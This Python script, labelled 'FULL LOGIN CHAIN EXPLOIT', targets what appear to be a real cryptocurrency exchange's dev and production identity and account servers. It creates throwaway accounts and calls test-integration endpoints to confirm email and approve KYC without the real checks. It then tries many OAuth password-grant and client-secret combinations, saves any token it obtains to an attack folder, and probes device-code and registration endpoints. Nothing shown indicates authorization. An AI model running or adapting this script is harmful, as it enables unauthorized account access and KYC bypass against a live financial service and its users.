import requests, json, sys, urllib3, uuid, time
urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
T = 20
H_FORM = {"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0"}
H_JSON = {"Content-Type":"application/json","User-Agent":"Mozilla/5.0"}

HKDEV_IDENTITY = "https://identityhkdev.mx.exchange"
PROD_IDENTITY = "https://identity.mx.exchange"
HKDEV_ACCOUNT = "https://accounthkdev.mx.exchange"
PROD_ACCOUNT = "https://account.mx.exchange"

# Generate fresh test email
uid = str(uuid.uuid4())[:6]
FRESH_EMAIL = f"mxtest{uid}@gmail.com"
FRESH_PASS = "MxTest2026!@#"

print("=" * 70)
print("MX EXCHANGE — FULL LOGIN CHAIN EXPLOIT")
print("=" * 70)

# ===== PHASE 1: Register fresh user on HK Dev =====
print(f"\n[1] Register fresh user on HK Dev Account API...")
print(f"    Email: {FRESH_EMAIL}")
print(f"    Password: {FRESH_PASS}")

reg_body = {
    "name": "Michael Chen",
    "email": FRESH_EMAIL,
    "password": FRESH_PASS,
    "confirmPassword": FRESH_PASS,
    "country": "MY",
    "accountType": 1,
}
try:
    r = requests.post(f"{HKDEV_ACCOUNT}/api/Account/Users", json=reg_body, 
                      headers=H_JSON, timeout=T, verify=False)
    print(f"    Status: {r.status_code}")
    print(f"    Headers: {dict(r.headers)}")
    print(f"    Body: {r.text[:500]}")
    
    # Try to get userId from Location header
    location = r.headers.get('Location', '')
    user_id = ''
    if location:
        user_id = location.split('/')[-1] if '/' in location else location
        print(f"    Location/userId: {user_id}")
except Exception as e:
    print(f"    ERROR: {e}")

# ===== PHASE 2: Confirm email via TestIntegrationEvent =====
print(f"\n[2] Confirm email via TestIntegrationEvent (HK Dev)...")
# The TestIntegrationEvent/ConfirmEmail endpoint needs a userId
# We may need to get it first from the registration response

# Try with the email as identifier, or try to find the user
# First, let's try the ConfirmEmail endpoint
for confirm_body in [
    {"email": FRESH_EMAIL},
    {"userId": user_id} if user_id else None,
    {"Email": FRESH_EMAIL},
    {"UserEmail": FRESH_EMAIL},
    {},
]:
    if confirm_body is None:
        continue
    try:
        r = requests.post(f"{HKDEV_ACCOUNT}/api/Account/TestIntegrationEvent/ConfirmEmail",
                         json=confirm_body, headers=H_JSON, timeout=T, verify=False)
        print(f"    Body={json.dumps(confirm_body)} => {r.status_code} {r.text[:200]}")
    except Exception as e:
        print(f"    Body={json.dumps(confirm_body)} => ERROR: {str(e)[:100]}")

# Also try ApproveKyc for good measure
print(f"\n[2b] ApproveKyc via TestIntegrationEvent...")
for body in [
    {"email": FRESH_EMAIL},
    {"userId": user_id} if user_id else None,
    {"Email": FRESH_EMAIL},
]:
    if body is None:
        continue
    try:
        r = requests.post(f"{HKDEV_ACCOUNT}/api/Account/TestIntegrationEvent/ApproveKyc",
                         json=body, headers=H_JSON, timeout=T, verify=False)
        print(f"    Body={json.dumps(body)} => {r.status_code} {r.text[:200]}")
    except Exception as e:
        print(f"    Body={json.dumps(body)} => ERROR: {str(e)[:100]}")

# ===== PHASE 3: Try ALL login combinations =====
print(f"\n[3] Login attempts with ALL known clients and formats...")

# Try with both fresh and original test user
users = [
    (FRESH_EMAIL, FRESH_PASS, "fresh"),
    ("testuser@gmail.com", "TestPass123!@#", "original"),
]

clients = [
    ("spa", "secret"),
    ("mx-mobile", "secret"),
    ("mx-mobile", ""),
    ("test", "secret"),
    ("test", ""),
]

# Token field variants
for email, password, user_label in users:
    print(f"\n  --- User: {user_label} ({email}) ---")
    for cid, csecret in clients:
        # Variant 1: token=password, provider=Email
        combos = [
            {"email": email, "token": password, "provider": "Email", "code": ""},
            {"email": email, "token": password, "provider": "email", "code": ""},
            {"email": email, "token": password, "provider": "Local", "code": ""},
            {"email": email, "token": password, "provider": "local", "code": ""},
            {"email": email, "token": password, "provider": "Password", "code": ""},
            {"email": email, "token": password, "provider": "password", "code": ""},
            {"email": email, "token": password, "provider": "", "code": ""},
            {"email": email, "token": password, "provider": "Credentials", "code": ""},
            # code=password variants
            {"email": email, "token": "", "provider": "Email", "code": password},
            {"email": email, "token": "", "provider": "Local", "code": password},
            {"email": email, "token": "", "provider": "", "code": password},
            # Direct email+password (standard ROPC)
            {"email": email, "password": password},
            # Username + password
            {"username": email, "password": password},
        ]
        
        for combo in combos:
            data = {
                "client_id": cid,
                "client_secret": csecret,
                "grant_type": "password",
            }
            data.update(combo)
            
            label = f"{cid}|{[f'{k}={v[:8]}' for k,v in combo.items() if v]}"
            
            try:
                r = requests.post(f"{HKDEV_IDENTITY}/connect/token", data=data,
                                headers=H_FORM, timeout=T, verify=False)
                
                if r.status_code == 200:
                    print(f"  [!!!TOKEN!!!] {label}")
                    print(f"    Response: {r.text[:500]}")
                    # Save immediately
                    with open(r"c:\xampp\htdocs\pentagi\mxexchange_attack\USER_TOKEN.json","w") as f:
                        json.dump({"combo": data, "response": r.json()}, f, indent=2)
                elif "unauthorized_client" in r.text:
                    pass  # grant not allowed for client
                elif "Not allowed" in r.text:
                    pass  # known
                elif "invalid_client" in r.text:
                    pass  # wrong secret
                elif "invalid_grant" in r.text and "Not allowed" not in r.text:
                    # Credentials wrong but grant accepted - note it
                    pass  # too many to print, we know it accepts
                else:
                    # Something NEW
                    resp = r.text[:200].encode('ascii','replace').decode('ascii')
                    print(f"  [NEW] {label} => {r.status_code} {resp}")
            except:
                pass

# ===== PHASE 4: Try PROD too =====
print(f"\n[4] Same combos on PROD identity...")
for email, password, user_label in users:
    for cid, csecret in [("mx-mobile", ""), ("mx-mobile", "secret"), ("spa", "secret")]:
        for combo in [
            {"email": email, "token": password, "provider": "Email", "code": ""},
            {"email": email, "token": password, "provider": "Local", "code": ""},
            {"email": email, "token": password, "provider": "Password", "code": ""},
            {"email": email, "token": password, "provider": "", "code": ""},
            {"email": email, "password": password},
        ]:
            data = {"client_id": cid, "client_secret": csecret, "grant_type": "password"}
            data.update(combo)
            label = f"PROD|{cid}|{user_label}|{combo.get('provider','pw')}"
            try:
                r = requests.post(f"{PROD_IDENTITY}/connect/token", data=data,
                                headers=H_FORM, timeout=T, verify=False)
                if r.status_code == 200:
                    print(f"  [!!!TOKEN!!!] {label}")
                    print(f"    Response: {r.text[:500]}")
                    with open(r"c:\xampp\htdocs\pentagi\mxexchange_attack\USER_TOKEN_PROD.json","w") as f:
                        json.dump({"combo": data, "response": r.json()}, f, indent=2)
                elif "invalid_grant" in r.text and "Not allowed" not in r.text:
                    pass  # known
                elif "unauthorized_client" in r.text or "Not allowed" in r.text or "invalid_client" in r.text:
                    pass
                else:
                    resp = r.text[:150].encode('ascii','replace').decode('ascii')
                    print(f"  [NEW] {label} => {r.status_code} {resp}")
            except:
                pass

# ===== PHASE 5: Try device_code flow =====
print(f"\n[5] Device code flow...")
for env, base in [("HKDEV", HKDEV_IDENTITY), ("PROD", PROD_IDENTITY)]:
    for cid in ["spa", "mx-mobile", "test"]:
        try:
            r = requests.post(f"{base}/connect/deviceauthorization", data={
                "client_id": cid, "scope": "openid accountApi walletApi"
            }, headers=H_FORM, timeout=T, verify=False)
            if r.status_code == 200:
                print(f"  [{env}|{cid}] Device auth => 200: {r.text[:300]}")
            elif r.status_code != 404 and "invalid_client" not in r.text:
                resp = r.text[:150].encode('ascii','replace').decode('ascii')
                print(f"  [{env}|{cid}] Device auth => {r.status_code}: {resp}")
        except:
            pass

# ===== PHASE 6: Try registration on Identity server directly =====
print(f"\n[6] Direct identity server registration endpoint...")
for env, base in [("HKDEV", HKDEV_IDENTITY), ("PROD", PROD_IDENTITY)]:
    for path in ["/api/Account/Register", "/Account/Register", "/connect/register",
                 "/api/v1/register", "/register"]:
        try:
            r = requests.post(f"{base}{path}", json={
                "email": FRESH_EMAIL, "password": FRESH_PASS, 
                "confirmPassword": FRESH_PASS
            }, headers=H_JSON, timeout=T, verify=False)
            if r.status_code not in (404, 405):
                resp = r.text[:200].encode('ascii','replace').decode('ascii')
                print(f"  [{env}] {path} => {r.status_code}: {resp}")
        except:
            pass

print(f"\n{'='*70}")
print("DONE")
print("=" * 70)
